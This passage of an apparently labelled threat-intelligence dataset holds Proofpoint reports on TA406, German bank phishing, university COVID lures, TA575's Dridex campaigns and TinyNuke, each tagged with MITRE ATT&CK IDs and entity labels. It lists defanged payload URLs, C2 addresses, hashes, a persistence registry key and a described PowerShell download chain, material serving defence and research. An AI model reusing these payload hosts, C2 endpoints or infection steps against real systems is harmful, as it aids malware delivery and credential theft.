hxxps[:]//cdn[.]discordapp[.]com/\u00a0\nattachments/902882967184113677/902903501724725280/TgrWe[.]dll\u00a0 | Excel Payload\u00a0 |\n| hxxps[:]//cdn[.]discordapp[.]com/\u00a0\nattachments/902882967184113677/902907845887012875/nmQxwiMDXToNFO[.]dll\u00a0 | Excel Payload\u00a0 |", "mitre_ids": ["S0384", "T1566", "S0384", "T1566", "T1566", "T1566", "S0384", "T1566", "T1105", "S0384", "T1486", "T1566", "S0384", "T1566", "T1566", "S0384", "T1204", "S0384", "S0384", "TA0011", "S0384", "TA0011", "S0384", "TA0011"], "anno_name_label": [["GROUP", "TA575"], ["GROUP", "TA575"], ["GROUP", "TA575"], ["GROUP", "TA575"], ["GROUP", "TA575"], ["GROUP", "TA575"], ["GROUP", "TA575"]], "cti_entity_class": ["CE", "CE", "CI", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Triple Threat: North Korea-Aligned TA406 Scams, Spies, and Steals\nNovember 18, 2021\n[**![](/sites/default/files/pdficon.png)\u00a0Download full report (PDF)**](/us/resources/threat-reports/triple-threat-north-korea-aligned-ta406-scams-spies-and-steals \"Triple Threat: North Korea Aligned TA406 Scams, Spies, and Steals\")\n### **Key Takeaways**\n* Throughout 2021, the North Korea-aligned threat actor TA406 conducted frequent credential theft campaigns targeting research, education, government, media and other organizations.\n* Proofpoint considers TA406 to be one of several actors that make up the activity publicly tracked as Kimsuky, Thallium and Konni Group.\n* TA406 doesn\u2019t usually employ [malware](https://www.proofpoint.com/us/threat-reference/malware) in campaigns.\nHowever, two notable 2021 campaigns attributed to this group attempted to distribute malware that could be used for information gathering.\n* TA406 engages in espionage, cyber crime and sextortion.\n### **Overview**\nThroughout 2021, Proofpoint has tracked ongoing credential theft campaigns from TA406, an actor associated with the Democratic People\u2019s Republic of Korea (DPRK).\nOur analysts have tracked TA406 campaigns targeting customers since 2018, but the threat actor\u2019s campaigns remained low in volume until the beginning of January 2021.\nFrom January through June 2021, Proofpoint observed almost weekly campaigns targeting foreign policy experts, journalists and nongovernmental organizations (NGOs).\n### **Introduction**\nIn this report, we describe in detail many of the campaigns and behaviors associated with an actor operating on behalf of the North Korean government: TA406.\n(See Figure 1.\nWe begin by explaining how TA406 is associated with Kimsuky, a threat actor name broadly tracked by the threat intelligence community.\nWe then elaborate on how Proofpoint tracks the activity of Kimsuky as three separate threat actors\u2014TA406, TA408 and TA427.\nAlso, we detail the differences between these actors, based on Proofpoint\u2019s visibility.\nThis report also examines campaign timing and targeting by TA406, and it provides a look into how TA406 conducts [phishing](https://www.proofpoint.com/us/threat-reference/phishing) campaigns, including the tools and services used.\nTA406 employs both malware and credential harvesting in espionage and information-gathering campaigns.\nThis report details several examples of each, including different types of credential collection and two implants used by TA406 that haven\u2019t been discussed before in open-source reporting.\nAnd finally, like all other North Korean state-sponsored actors that Proofpoint tracks, we provide evidence that TA406 conducts financially motivated campaigns, including the targeting of cryptocurrency and sextortion.\n[![MicrosoftTeams-image (25)](/sites/default/files/inline-images/MicrosoftTeams-image%20%2825%29.png)]\n(/sites/default/files/figures/TA406-activity-diagram.png)\n*Figure 1. TA406 activity diagram**.*\n**To read more,\u00a0[download the full report](/us/resources/threat-reports/triple-threat-north-korea-aligned-ta406-scams-spies-and-steals \"Triple Threat: North Korea Aligned TA406 Scams, Spies, and Steals\")[.](https://www.proofpoint.com/us/resources/threat-reports/triple-threat-north-korea-aligned-ta406-scams-spies-and-steals)**\nTo download indicators of compromise, head [here](https://github.com/EmergingThreats/threatresearch/tree/master/ta406).", "mitre_ids": ["G0094", "G0094", "G0094", "G0094", "G0094", "G0094", "G0094", "G0094", "G0094", "G0094", "G0094", "G0094", "G0094", "G0094", "G0094", "G0094", "G0094", "G0094", "G0094", "G0094", "G0094", "TA0006", "TA0006", "G0094", "G0094", "G0094", "G0094", "G0094"], "anno_name_label": [], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "High Volume German Phishing Campaign Aims to Steal Banking Credentials\nNovember 30, 2021\nProofpoint researchers identified an increase in credential phishing campaigns attempting to steal German banking credentials.\nSince the end of August 2021, Proofpoint researchers observed multiple high-volume campaigns leveraging customized, actor-owned landing pages spoofing major German banks, notably Volksbank and Sparkasse.\nThe activity is ongoing and continues to impact hundreds of organizations.\nThe campaigns targeted multiple industries, specifically German companies and employees of foreign entities located in Germany.\nEach campaign included tens of thousands of messages impacting hundreds of organizations.\nThe phishing emails purport to be account administration information and contain links or QR codes that direct the victim to a geo-fenced credential harvesting page.\nTargeted information includes banking branch data, login identification, and PIN.\n![deabnk1](/sites/default/files/inline-images/debank1_0.png)\n![debank2](/sites/default/files/inline-images/DEbank2_0.png)\n*Figure 1: Email samples containing QR code (left) and link to spoofed website (right).*\nThe threat actor has used multiple URL redirection techniques to deliver the malicious links.\nIn several observed campaigns, the threat actor leveraged compromised Wordpress websites to redirect users to the phishing landing pages.\nAbusing Wordpress plugins and websites running Wordpress software is a [common technique](https://portswigger.net/daily-swig/url-redirect-malware-infects-thousands-of-wordpress-sites) used by threat actors to distribute malicious links for phishing and malware attacks.\nAdditionally, researchers observed both Feedproxy URLs and QR codes used to redirect to the phishing pages.\nThe threat actor leverages geo-fencing techniques to ensure only users in Germany are redirected to the phishing page.\nProofpoint assesses with high confidence the threat actors are conducting IP geolocation checks to identify a target\u2019s location.\nIf they are not in Germany, the user is directed to a clone of a website purporting to be tourist information for the Rhine Tower in Dusseldorf, Germany.\nIf a user is in Germany, they will be directed to a webpage masquerading as a legitimate banking website.\n![debank3](/sites/default/files/inline-images/debank3_1.png)\n![deabnk4](/sites/default/files/inline-images/debank4_1.png)\n*Figure 2: Actor hosted pages spoofing legitimate banking websites.*\nThe user is encouraged to choose their Branch location and click \u201cLogin\u201d to be directed to the credential capture page, spoofing the legitimate banking site.\n![debank5](/sites/default/files/inline-images/debank5_0.png)\n![debank6](/sites/default/files/inline-images/debank6_0.png)\n*Figure 3: Actor hosted banking credential capture web pages.*\nThe actor hosts these pages on their own actor-controlled infrastructure using similar domain naming patterns.\nFor example, the Sparkasse credential phishing URLs often start with \u201cspk-\u201d while Volksbank clones begin with \u201cvr-\u201d.\nThe following are a sample of the domains used by this threat actor:\n* vr-mailormular[.]com/Q20EBD6QLJ\n* vr-umstellungssystem-de[.]com/FLBSEKZ9S3\n* spk-security-spk[.]com/P84OZ3OIS2\n* spk-systemerneuerung-spk[.]com/CJ4F6UFR0T\nTypically, the actor uses the domain registrar REG.RU, with domains hosted via AliCloud (Germany) GmbH.\nThe first domains associated with this activity appeared in late August 2021.\nThe actor/s is/are consistently registering new domains in the identified URL structure and the campaigns are ongoing.\nProofpoint is not able to attribute this campaign to a known threat group.\nHowever, registrant information associated with multiple domains observed in some this activity is linked to over 800 fraudulent websites, most of which spoof banks or financial services.\nDomain registration indicates this actor may have been focused on targeting users of Spanish banks earlier this year.\nCybercriminal threat actors associated with banking credential theft and fraudulent financial activity tend to be opportunistic and target large numbers of victims.\nThis is typically referred to as \u201cspray and pray\u201d activity, sending mass email campaigns in the hopes some of the targeted individuals fall for their scams.\n**Conclusion**\nToday\u2019s threats target people, not infrastructure.\nThat\u2019s why you must take a people-centric approach to cybersecurity.\nThat includes user-level visibility into vulnerability, attacks and privilege and tailored controls that account for individual user risk.\nHere\u2019s what we recommend as a starting point.\n* Train users to spot and report malicious email.\nRegular training and simulated attacks can stop many attacks and help identify people who are especially vulnerable.\nThe best simulations mimic real-world attack techniques.\nLook for solutions that tie into real-world attack trends and the latest threat intelligence.\n* At the same time, assume that users will eventually click some threats.\nAttackers will always find new ways to exploit human nature.\nFind a solution that spots and blocks inbound email threats targeting employees before they reach the inbox.\nInvest in a solution can manage the entire spectrum of email threats, not just malware-based threats.\nSome threats\u2014including business email compromise (BEC) and other forms of email fraud\u2014can be hard to detect with conventional security tools.\nYour solution should analyze both external and internal email\u2014attackers may use compromised accounts to trick users within the same organization.\nWeb isolation can be a critical safeguard for unknows and risky URLs.", "mitre_ids": ["T1566", "T1566", "TA0006", "T1056", "T1566", "TA0006", "T1566", "T1056", "T1566", "T1566", "T1566", "T1566", "T1566", "T1566", "T1614", "T1056", "T1566", "T1583", "TA0006", "T1566", "T1204", "T1566", "T1586"], "anno_name_label": [], "cti_entity_class": ["CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI"]}, {"cti_report": "University Targeted Credential Phishing Campaigns Use COVID-19, Omicron Themes\nDecember 07, 2021\nProofpoint researchers have identified an increase in email threats targeting mostly North American universities attempting to steal university login credentials.\nThe threats typically leverage COVID-19 themes including testing information and the new Omicron variant.\nProofpoint observed COVID-19 themes impacting education institutions throughout the pandemic, but consistent, targeted credential theft campaigns using such lures targeting universities began in October 2021.\nFollowing the announcement of the new\u00a0[Omicron](https://www.who.int/news/item/26-11-2021-classification-of-omicron-(b.1.1.529)-sars-cov-2-variant-of-concern)\u00a0variant in late November, the threat actors began leveraging the new variant in credential theft campaigns.\nThreat actors continue to use COVID-19 theme lures in campaigns targeting multiple industries and geographic areas.\nThe threats specifically targeting universities is interesting due to the specificity in targeting and effort to mimic legitimate login portals.\nIt is likely this activity will increase in the next two months as colleges and universities provide and require testing for students, faculty, and other workers traveling to and from campus during and after the holiday season, and as the Omicron variant emerges more widely.\nWe expect more threat actors will adopt COVID-19 themes given the introduction of the Omicron variant.\nThis assessment is based on previously\u00a0[published research](https://www.proofpoint.com/us/blog/threat-insight/delta-variant-spreads-covid-19-themes-make-resurgence-email-threats)\u00a0that identified COVID-19 themes making a resurgence in email campaigns\u00a0\nfollowing the emergence of the Delta variant in August 2021.\n### **Campaign Details**\nThe COVID-19 themed campaigns including Omicron variant lures include thousands of messages targeted to dozens of universities in North America.\nThe [phishing emails](/us/threat-reference/phishing \"Phishing\") contain attachments or URLs for pages intended to harvest credentials for university accounts.\nThe landing pages typically imitate the university\u2019s official login portal, although some campaigns feature generic Office 365 login portals.\nIn some cases, such as the Omicron variant lures, victims are redirected to a legitimate university communication after credentials are harvested.\nProofpoint observed this threat actor pivot from Delta variant themed email lures to Omicron themes following the announcement of the new variant.\nEmails with URLs use subjects such as:\nAttention Required - Information Regarding COVID-19 Omicron Variant - November 29\nWith a link to a spoofed landing page such as:\n![Spoofed login page](/sites/default/files/inline-images/Screen%20Shot%202021-12-02%20at%2012.41.57%20PM.png)\n*Figure 1: Spoofed login page for the University of Central Missouri.*\nMessages distributing attachments included subject lines such as \u201cCovid Test\u201d.\n![HTM attachment ](/sites/default/files/inline-images/Screen%20Shot%202021-12-02%20at%2012.42.30%20PM.png)\n*Figure 2: HTM attachment leading to a credential capture webpage.*\nThe attachments lead to a university themed email credential theft webpage.\n![Credential theft webpage](/sites/default/files/inline-images/Screen%20Shot%202021-12-02%20at%2012.42.55%20PM_0.png)\n*Figure 3: Credential theft webpage spoofing Vanderbilt University.*\nProofpoint has identified multiple threat clusters using COVID-19 themes to target universities using different tactics, techniques, and procedures (TTPs).\nIn addition to multiple delivery methods \u2013 Proofpoint has observed both URL and attachments in campaigns \u2013 activity clusters use different sender and hosting methods to distribute credential theft campaigns.\nIn the Omicron variant campaign, threat actors leverage actor-controlled infrastructure to host credential theft webpages using similar domain naming patterns.\nThese include:\n* sso[.]ucmo[.]edu[.]boring[.]cf/Covid19/authenticationedpoint.html\n* sso2[.]astate[.]edu[.]boring[.]cf/login/authenticationedpoint.html\nAttachment-based campaigns have leveraged legitimate but compromised WordPress websites to host credential capture webpages, including:\n* hfbcbiblestudy[.]org/demo1/includes/jah/[university]/auth[.]php\n* afr-tours[.]co[.]za/includes/css/js/edu/web/etc/login[.]php\n* traveloaid[.]com/css/js/[university]/auth[.]php\nIn some campaigns, threat actors attempted to steal [multifactor authentication (MFA)](/us/threat-reference/multifactor-authentication \"Multifactor Authentication\") credentials, spoofing MFA providers such as Duo. Stealing MFA tokens enables the attacker to bypass the second layer of security designed to keep out threat actors who already know a victim\u2019s username and password.\n![Duo MFA credential theft ](/sites/default/files/inline-images/Screen%20Shot%202021-12-02%20at%2012.43.28%20PM_0.png)\n*Figure 4: Duo MFA credential theft landing page.*\nWhile many messages are sent via spoofed senders, Proofpoint has observed threat actors leveraging legitimate, compromised university accounts to send COVID-19 themed threats.\nIt is likely the threat actors are stealing credentials from universities and using compromised mailboxes to send the same threats to other universities.\nProofpoint does not attribute this activity to a known actor or threat group, and the ultimate objective of the threat actors is currently unknown.\n**Indicators of Compromise**\n| Indicator\u00a0 | Description\u00a0 |\n| hfbcbiblestudy[.]org/demo1/includes/jah/[university]/auth[.]php\u00a0 | Credential Theft URL\u00a0 |\n| afr-tours[.]co[.]za/includes/css/js/edu/web/etc/login[.]php\u00a0 | Credential Theft URL\u00a0 |\n| traveloaid[.]com/css/js/[university]/auth[.]php\u00a0 | Credential Theft URL\u00a0 |\n| traveloaid[.]com/css/js/[university]/auth[.]php\u00a0 | Credential Theft URL\u00a0 |\n| offthewallgraffiti[.]org/[university]/auth[.]php\u00a0 | Credential Theft URL\u00a0 |\n| traveloaid[.]com/css/js/[university]/auth[.]php\u00a0 | Credential Theft URL\u00a0 |\n| sso[.]ucmo[.]edu[.]boring[.]cf/Covid19/authenticationedpoint.html\u00a0 | Credential Theft URL\u00a0 |\n| sso2[.]astate[.]edu[.]boring[.]cf/login/authenticationedpoint.html\u00a0 | Credential Theft URL\u00a0 |\n| 242smarthome[.]com/[university]/auth.php\u00a0 | Credential Theft URL\u00a0 |\n| jass-butz[.]at/xx/main/main.php\u00a0 | Credential Theft URL\u00a0 |\n| Bluecollarsubs[.]com/main/\u00a0main.php\u00a0 | Credential Theft URL\u00a0 |", "mitre_ids": ["T1566", "T1566", "TA0006", "TA0006", "TA0006", "T1566", "T1566", "T1566", "T1566", "T1566", "T1056", "T1056", "T1056", "TA0006", "T1566", "T1566", "T1566", "T1566", "T1566", "T1566", "T1056", "T1056", "T1566", "T1566", "T1583", "T1566", "T1584", "T1056", "T1111", "T1586", "T1586"], "anno_name_label": [], "cti_entity_class": ["CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI"]}, {"cti_report": "That Holiday Feelin\u2019: TA575 Brings the Warm and Fuzzies with Year-end, Festive Lures\nDecember 09, 2021\n<!--/*--><![CDATA[/* ><!--*/\n<!--/*--><![CDATA[/* ><!--*/\n<!--/*--><![CDATA[/* ><!--*/\ntable {\nmargin: 0 auto !important;\n}\ntable, tr, th, td {\nborder: 0 !important;\n}\nth, td {\nwidth: 50% !important;\nfont-family: Helvetica, Arial, \"sans-serif\" !important;\nfont-size: 16px !important;\ntext-align: center !important;\n}\n/*--><!]]]]]]><![CDATA[><![CDATA[>*/\n/*--><!]]]]><![CDATA[>*/\n/*--><!]]>*/\nThe threat actor tracked by Proofpoint as TA575 has kicked off the festive season with holiday-themed lures and is getting a head start on tax season in their latest high-volume campaigns.\nProofpoint researchers have observed a range of email subjects from \"Black firday and Cyber Monday Survey Scam alert\" to \"Christmas tips: Preparing for Holydays,\" \"Holiday Survey Threats beware,\" and even \"Winter lifehacks: Cutest Tax Credit.\nThe ultimate intent of the campaigns is to lure potential victims into downloading the Dridex banking trojan.\nDridex, which is a prolific piece of malware distributed by multiple affiliates, can lead to theft of personally identifiable information and installation of secondary payloads such as [ransomware](/us/threat-reference/ransomware \"Ransomware\").\nThe campaigns have impacted numerous industries, such as education, manufacturing, local government, insurance, and finance in the United States\u2014a typical geographic focus of TA575.\n### November 2021 Campaigns\nTA575 began this year's spate of holiday campaigns on November 24, 2021.\nThe emails delivered malicious Microsoft Excel file attachments that, if opened, used XL4 macros to download and execute Dridex affiliate id \"22201\" from a URL.\nA November 29, 2021 campaign shifted to pulling Dridex affiliate id \"22202\" from Discord URLs. TA575 has used the Discord content delivery network (CDN) to host and distribute the banking trojan in other\u00a0[campaigns](https://www.proofpoint.com/us/blog/threat-insight/ta575-uses-squid-game-lures-distribute-dridex-malware)\u00a0this year.\nTA575's November 2021 campaigns veered away from the more wholesome and, at times, religious themes used by the group in 2020 to play on potential victims' desires for discounts and fears over being scammed this holiday season.\nA sample of the lures used in 2020 versus November 2021 is as follows:\u00a0\n| **Holiday 2020 Lures:** | **November 2021 Lures:** |\n| --- | --- |\n| Enjoy the turkey together.\nHappy holidays 2020.\nI am truly grateful to you.\nSharing is caring.\nPrepare for the silly season | Black Friday Amazon coupon #40868249\nHoliday Survey Threats warning.\nThanksgiving Ebay gift coupon #1654420\nDon't Fall for This Holiday Survey Threats\nBlack Friday Survey Fraud alert.\n|\n![Email samples](/sites/default/files/inline-images/Screen%20Shot%202021-12-06%20at%207.02.17%20PM.png)\n*Figure 1.\nEmail samples: top right from November 2020 campaign; bottom right from November 24, 2021; left from November 29, 2021.*\n### December 2021 Campaign\nIn December 2021, TA575 started to use both Microsoft Excel and Word attachments to deliver Dridex via Discord URLs, HTA files, and remote template.\nThe campaign used both the Dridex affiliate id \"22201\" and \"22204.\nIn some cases, the emails combined themes, using both the approaching holidays and the coming new year with US tax filing preparation and spoofing popular do-it-yourself tax services as seen in Figure 2.\n![spoofing ](/sites/default/files/inline-images/Screen%20Shot%202021-12-06%20at%207.02.44%20PM.png)\n*Figure 2. December 1, 2021 email spoofing a tax service.*\n### Conclusion\nTA575, like other threat actors, is adept at using current events-based lures to take advantage of people being more interested in the topic than keeping their guard up from nefarious schemes.\nDuring the holiday season, users become desensitized to receiving numerous advertising links for shopping deals and the like and may not think twice about opening a dangerous file or clicking a suspicious link.\nGiven the widespread nature of these campaigns, any number of users and/or organizations could be impacted.\n**2021 Indicators of Compromise**\n| **Indicator** | **Description** |\n| 149[.]56[.]106[.]83:443\u00a0 | Dridex\u00a0\u201c22201\u201d\u00a0&\u00a0\u201c22204\u201d\u00a0C2\u00a0 |\n| 45[.]79[.]248[.]254:2222\u00a0 | Dridex\u00a0\u201c22201\u201d\u00a0&\u00a0\u201c22204\u201d\u00a0C2\u00a0 |\n| 144[.]91[.]110[.]55:3978\u00a0 | Dridex\u00a0\u201c22201\u201d\u00a0&\u00a0\u201c22204\u201d\u00a0C2\u00a0 |\n| 94[.]177[.]217[.]88:808\u00a0 | Dridex\u00a0\u201c22201\u201d\u00a0&\u00a0\u201c22204\u201d\u00a0C2\u00a0 |\n| 185[.]4[.]135[.]165:5228\u00a0 | Dridex\u00a0\u201c22201\u201d\u00a0&\u00a0\u201c22204\u201d\u00a0C2\u00a0 |\n| afceea7c2fc2d273a60c73d209f4a700b98aa2d8df9740fb0a08c3ae47890539\u00a0 | Dridex\u00a0SHA256\u00a0\u00a0 |\n| b61f624589d5ad3584e09f3174f8e3e1ac38958f260eee526b0abaf7389d7932\u00a0 | Dridex\u00a0SHA256\u00a0 |\n| 7f7aef4e87411653743576c1de6933c3736e6153faae926fbfb9add35ac2f93f\u00a0 | Dridex\u00a0SHA256\u00a0 |\n| aef59db50378667cff8b3181421445c59a27932d835d47f016a879ced1f04dd7\u00a0 | Dridex\u00a0SHA256\u00a0 |\n| 4f6b068caf0cdbb62c0daaf4ee2f861820563c62853bfcad43a0e6d88cfdbe68\u00a0 | Dridex\u00a0SHA256\u00a0 |\n| \u00a0\n|  |  |\n|  |  |\n|  |  |\n\u00a0 |\n| \u00a0 |", "mitre_ids": ["S0384", "S0384", "T1486", "T1486", "T1566", "T1059", "S0384", "T1204", "T1105", "S0384", "T1105", "T1102", "T1105", "T1566", "S0384", "T1059", "T1105", "T1059", "S0384", "T1566", "T1566", "T1566", "S0384", "TA0011", "S0384", "TA0011", "S0384", "TA0011", "S0384", "TA0011", "S0384", "TA0011", "S0384", "S0384", "S0384", "S0384", "S0384"], "anno_name_label": [["GROUP", "TA575"], ["GROUP", "TA575"], ["GROUP", "TA575"], ["GROUP", "TA575"], ["GROUP", "TA575"], ["GROUP", "TA575"], ["GROUP", "TA575"], ["GROUP", "TA575"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "TinyNuke Banking Malware Targets French Entities\nDecember 13, 2021\n### Key Findings\n* Proofpoint researchers identified ongoing activity from the banking malware TinyNuke.\n* The activity nearly exclusively targets French entities and organizations with operations in France.\n* The campaigns leverage invoice-themed [lures](/us/blog/threat-insight/bec-taxonomy-lures-and-tasks \"BEC Taxonomy: Lures and Tasks \") targeting entities in manufacturing, industry, technology, finance, and other verticals.\n* The new activity demonstrates a re-emergence of the malware specifically targeting French users that peaked in popularity in 2018.\n### Overview\nProofpoint identified multiple recent campaigns leveraging invoice-themed lures to distribute the uncommonly observed TinyNuke malware.\nThe activity marks a stark reappearance of this threat, which has not been seen with regularity since 2018.\nThe campaigns target hundreds of customers in various industries including manufacturing, technology, construction, and business services.\nThe campaigns use French language lures with invoice or other financial themes, and almost exclusively target French entities and companies with operations in France.\nTinyNuke is a banking trojan that first appeared in Proofpoint data in 2017 targeting French companies.\nIt is similar to the notorious banking trojan Zeus, which has\u00a0[many variants](/us/blog/threat-insight/zloader-loads-again-new-zloader-variant-returns \"ZLoader Loads Again: New ZLoader Variant Returns\")\u00a0with identical functionality.\nTinyNuke can be used to steal credentials and other private information and can be used to enable follow-on [malware attacks](/us/threat-reference/malware \"Malware\").\nThe author initially\u00a0[released](https://github.com/aainz/TinyNuke)\u00a0the code on GitHub in 2017, and although the original repo is no longer available, other open-source versions of the malware exist.\n### Campaign Details\nProofpoint observed dozens of TinyNuke campaigns targeting French entities in 2018.\nAfter only observing a handful of TinyNuke campaigns in 2019 and 2020, Proofpoint observed TinyNuke reappear in January 2021 in one campaign distributing around 2,000 emails.\nSubsequent campaigns appeared in low volumes in May, June, and September.\nIn November, Proofpoint identified multiple TinyNuke campaigns distributing around 2,500 messages and impacting hundreds of customers.\nIn the most recent campaigns, the threat actor uses invoice-themed lures purporting to be logistics, transportation, or business services entities.\n![Email lure with link leading to the download of TinyNuke.](/sites/default/files/inline-images/Screen%20Shot%202021-12-08%20at%201.55.44%20PM.png)\n*Figure 1: Email lure with link leading to the download of TinyNuke.*\nThese messages contain URLs that lead to the download of a compressed executable responsible for installing TinyNuke.\nProofpoint first observed TinyNuke in 2017 used as a second-stage payload in a Zeus banking trojan campaign targeting French entities.\nIts use peaked in 2018 before all but disappearing in Proofpoint data in 2019 and 2020.\n![TinyNuke campaign data.](/sites/default/files/inline-images/Screen%20Shot%202021-12-08%20at%201.55.59%20PM.png)\n*Figure 2: TinyNuke campaign data.*\nProofpoint has observed three times as many TinyNuke campaigns in 2021 as the two previous years combined.\nBut while threat actors have conducted more campaigns this year, they are distributing fewer messages compared to previous years.\n![TinyNuke](/sites/default/files/inline-images/Screen%20Shot%202021-12-12%20at%205.02.24%20PM.png)\n*Figure 3: TinyNuke message data.*\nThough the number of 2021 campaigns is less than 2018, TinyNuke\u2019s reappearance and consistent targeting of French organizations is striking, suggesting it is a re-emerging threat in the French cybercrime threat landscape.\nProofpoint assesses there are at least two distinct activity sets using TinyNuke based on different lure themes, payload deployment, and command and control (C2) infrastructure.\nSpecifically, one intrusion set associated with the initial TinyNuke actors uses Tor for C2 since 2018, while commodity actors typically leverage clear web C2.\nOpen source\u00a0[reporting suggests](https://blog.heat-miser.net/posts/tinynuke/)\u00a0the malware version using Tor which Proofpoint has observed with continued regularity is not publicly available, and likely used only by the original TinyNuke threat actors.\nThe following analysis focuses on the most frequently observed activity set responsible for most of the TinyNuke campaigns in 2021.\n### Malware Details\nIn the recently observed campaigns, messages are sent with URLs that lead to ZIP files.\nThe ZIP files contain a JavaScript file (e.g. Facture-78224UDJ2021.js) which is invoked by the Microsoft Windows native binary wscript.\nPowerShell is then executed and leverages the Start-BitsTransfer cmdlet to download another ZIP file (e.g. putty.zip) which contains the TinyNuke PE file.\n![PowerShell Command Line sample.](/sites/default/files/inline-images/Screen%20Shot%202021-12-08%20at%201.56.47%20PM.png)\n*Figure 4: PowerShell Command Line sample.*\nThe actor generally uses legitimate, but compromised, websites to host the payload URL.\nThe websites are typically French language, and do not share a common theme.\nThe following binaries are dropped to disk and executed.\nC:\\Users\\[User]\\AppData\\Roaming\\E02BC647BACE72A1\\tor.exe\nC:\\Users\\[User]\\AppData\\Roaming\\E02BC647BACE72A1\\firefox.exe\nC:\\Users\\[User]\\AppData\\Roaming\\putty.exe\nIn the recently observed campaigns, C2 communications occur via Tor. For example: fizi4aqe7hpsts3r[.]onion/hci/client[.]php\nProofpoint researchers observed the string \"nikoumouk\" sent to the C2 server for an unknown purpose.\nAccording to information sharing partners and open-source information, the actors previously used that string in C2 communications in previous campaigns since 2018.\nThe string is an insult in popular Arabic, mainly used in French speaking suburbs in Europe.\nPersistence is achieved by adding an entry in the registry under the following location.\nKey: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\x00E02BC647BACE72A1\\xe4\\x8d\\x82\nData:\u00a0C:\\Users\\[User]\\AppData\\Roaming\\E02BC647BACE72A1\\firefox.exe\nOnce installed, the TinyNuke loader can be used for data and credential theft with formgrabbing and webinject capabilities for Firefox, Internet Explorer, and Chrome, and to install follow on payloads.\n### Related Threat Actors\nProofpoint identified TinyNuke infrastructure used in campaigns in 2018 overlapped with\u00a0[PyLocky ransomware attacks](https://www.trendmicro.com/en_us/research/18/i/a-closer-look-at-the-locky-poser-pylocky-ransomware.html)\u00a0first reported that year.\nHowever, Proofpoint has not observed ransomware activity associated with TinyNuke in subsequent campaigns.\nPublic reporting\u00a0[associates](https://krebsonsecurity.com/2019/12/nuclear-bot-author-arrested-in-sextortion-case/)\u00a0the original TinyNuke author with an individual charged in a French sextortion case, and was imprisoned before\u00a0[reportedly](https://blog.heat-miser.net/posts/tinynuke/)\u00a0being released under legal supervision in 2020 during a spike in the COVID pandemic.\nIn 2017, the accused individual previously claimed to be the original author of TinyNuke in an\u00a0[interview](https://krebsonsecurity.com/2017/04/self-proclaimed-nuclear-bot-author-weighs-u-s-job-offer/)\u00a0with the journalist Brian Krebs.\nTinyNuke actors have also reportedly\u00a0[taunted](https://blog.heat-miser.net/posts/tinynuke/)\u00a0and harassed security researchers investigating TinyNuke activity.\nProofpoint does not associate TinyNuke with a known threat actor or group.\nThe malware is publicly available and likely used by multiple threat actors, however Proofpoint assesses with high confidence at least some of the original threat actors distributing TinyNuke in 2018 continue to use it.\n### Conclusion\nTinyNuke has re-emerged as a threat to French organizations, and entities with operations in France.\nOf note, in most of the recent campaigns the actor has stayed consistent with using URLs to ZIP files and the continued use of Tor for C2 communications.\nThe malware can be used for data and financial theft, and compromised machines may be added to a botnet under the control of the threat actor.\n### Indicators of Compromise\nProofpoint identified the following indicators of compromise in 2021 campaigns.\n| **Indicator**  | **Description** | **First Observed** |\n| fizi4aqe7hpsts3r[.]onion/hci/client.php | TinyNuke C2 | May 2021 |\n| hxxps://www[.]genou-alsace[.]fr/putty.zip | TinyNuke Payload URL | November 2021 |\n| hxxps://addendasoftware[.]com/blog2/wp-content/uploads/2021/11/putty.zip\n\u00a0 | TinyNuke Payload URL | November 2021 |\n| hxxps://www[.]edmf[.]org/redirect\\_d2CORIvmZ/putty.zip\n\u00a0 | TinyNuke Payload URL | November 2021 |\n| hxxp://www[.]palette-events[.]com/css/\\_notes/putty.zip | TinyNuke Payload URL | November 2021 |\n| hxxp://laurentabert[.]fr/setup.zip | TinyNuke Payload URL | September 2021 |\n| hxxp://www[.]energym63[.]com/10451372/cports.exe | TinyNuke Payload URL | June 2021 |\n| hxxp://www[.]energym63[.]com/10451372/putty2.zip | TinyNuke Payload URL | June 2021 |\n| hxxp://www[.]lightcharts[.]com/old-website/putty.zip | TinyNuke Payload URL | May 2021 |\n| hxxps://baloobajojonako[.]fr/panel/client.php?47F3640E5BCAD613 | TinyNuke C2 | January 2021 |\n| hxxps://lft[.]orange[.]fr/spaces/download/\nQYQ9IHG325rxm/600686abb5395430a1363770 | TinyNuke Payload URL | January 2021 |\n| 5ba482a11f1a99293a249c350c360cd0d8f1456dfcfd27bf0b4189511e4800d8 | TinyNuke SHA256 | January 2021 |", "mitre_ids": ["TA0006", "T1005", "T1566", "T1566", "T1566", "T1566", "T1566", "T1566", "TA0011", "TA0011", "TA0011", "TA0011", "T1566", "T1059", "T1059", "T1105", "T1055", "T1059", "T1059", "T1584", "T1105", "T1071", "TA0011", "TA0011", "T1547", "T1547", "TA0006", "T1189", "T1486", "T1566", "TA0011", "TA0011", "TA0011"], "anno_name_label": [["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "Zeus"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", 